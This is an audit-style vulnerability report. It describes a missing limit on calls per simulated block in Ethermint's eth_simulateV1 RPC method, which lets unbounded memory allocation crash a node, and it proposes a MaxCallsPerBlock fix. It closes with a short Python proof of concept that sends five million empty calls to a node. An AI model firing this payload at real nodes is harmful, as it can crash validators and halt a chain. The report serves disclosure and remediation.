### Title
Unbounded `Calls` per `SimBlock` in `eth_simulateV1` Bypasses `MaxSimulateBlocks` Resource Limit, Enabling Node OOM Crash — (File: `x/evm/keeper/simulate.go`)

### Summary

`eth_simulateV1` enforces a hard cap of `MaxSimulateBlocks = 256` on the number of simulated blocks, but imposes no upper bound on the number of calls inside each `SimBlock`. The `processBlock` function allocates two slices proportional to `len(block.Calls)` before any gas or budget check runs. An unprivileged caller can submit a single block containing millions of minimal `{}` call objects, causing the node to allocate gigabytes of memory and crash with OOM, halting the chain if the JSON-RPC server shares a process with the validator.

### Finding Description

`rpc/types/simulate.go` defines the only enforced limit:

```go
const MaxSimulateBlocks = 256
``` [1](#0-0) 

This limit is checked at the RPC backend layer and again inside the gRPC keeper:

```go
} else if len(opts.BlockStateCalls) > rpctypes.MaxSimulateBlocks {
    return nil, &rpctypes.ClientLimitExceededError{Message: "too many blocks"}
}
``` [2](#0-1) 

```go
if len(payload.Opts.BlockStateCalls) > rpctypes.MaxSimulateBlocks {
    return nil, status.Error(codes.InvalidArgument, "too many blocks in blockStateCalls")
}
``` [3](#0-2) 

`SimBlock` is defined as:

```go
type SimBlock struct {
    BlockOverrides *SimBlockOverrides `json:"blockOverrides"`
    StateOverrides *SimStateOverride  `json:"stateOverrides"`
    Calls          []json.RawMessage  `json:"calls"`
}
``` [4](#0-3) 

`Calls` carries no length constraint. Inside `processBlock`, the very first operations are two unbounded slice allocations:

```go
callResults := make([]rpctypes.SimCallResult, len(block.Calls))
transactions := make([]*ethtypes.Transaction, len(block.Calls))
``` [5](#0-4) 

These allocations occur **before** any gas or budget check. The `GasBudget` and `remainingBlockGas` only gate execution of individual calls; they do not prevent the upfront memory allocation proportional to `len(block.Calls)`.

The `sanitizeChain` function also enforces a block-span check, but it operates on block numbers, not on the call list: [6](#0-5) 

No analogous bound exists for `len(block.Calls)` anywhere in the call path.

### Impact Explanation

An attacker submits a single `eth_simulateV1` request with one `SimBlock` containing N million minimal call objects (`{}`). The server immediately allocates `O(N)` memory for `callResults` and `transactions` before executing a single call or checking any gas budget. With a 10 MB JSON body (each `{}` is 2 bytes), N ≈ 5,000,000. If `SimCallResult` is ~100–200 bytes, the allocation reaches 500 MB–1 GB in a single request. Multiple concurrent requests compound this. The result is an OOM crash of the node process. In standard Ethermint deployments the JSON-RPC server runs in the same OS process as the validator; an OOM kill halts the validator and causes a consensus failure.

**Impact category**: Critical — unprivileged RPC submission path can halt the chain.

### Likelihood Explanation

The `eth_simulateV1` endpoint is publicly reachable with no authentication. The attack requires only a crafted JSON payload; no private keys, governance access, or special roles are needed. The attack is trivially reproducible with a single HTTP request. Any node exposing the JSON-RPC port is vulnerable.

### Recommendation

Enforce an explicit upper bound on `len(block.Calls)` before the slice allocations in `processBlock` (or in `SimulateV1` / `Execute` before dispatching). A reasonable limit (e.g., `MaxCallsPerBlock = 1024` or tied to `blockGasLimit / intrinsicGas`) should be checked and rejected with a `ClientLimitExceededError`, mirroring the existing `MaxSimulateBlocks` pattern:

```go
const MaxCallsPerBlock = 1024

// in processBlock or Execute, before make([]SimCallResult, ...)
if len(block.Calls) > MaxCallsPerBlock {
    return nil, &rpctypes.ClientLimitExceededError{
        Message: fmt.Sprintf("too many calls in block: %d > %d", len(block.Calls), MaxCallsPerBlock),
    }
}
```

### Proof of Concept

```python
import requests, json

# Craft a single block with 5,000,000 empty calls
calls = [{}] * 5_000_000
payload = {
    "jsonrpc": "2.0",
    "method": "eth_simulateV1",
    "params": [
        {"blockStateCalls": [{"calls": calls}]},
        "latest"
    ],
    "id": 1
}
# Send to any Ethermint node with JSON-RPC exposed
requests.post("http://<node>:8545", json=payload, timeout=120)
# Node process receives the request, allocates ~500MB–1GB for
# make([]SimCallResult, 5_000_000) before any gas check runs,
# triggering OOM and crashing the validator process.
```

The `MaxSimulateBlocks = 256` block-count guard passes (only 1 block is submitted), the `sanitizeChain` span check passes (block number = base+1), and the gas budget is never reached because the OOM occurs during the upfront allocation in `processBlock` at lines 178–179 of `x/evm/keeper/simulate.go`.
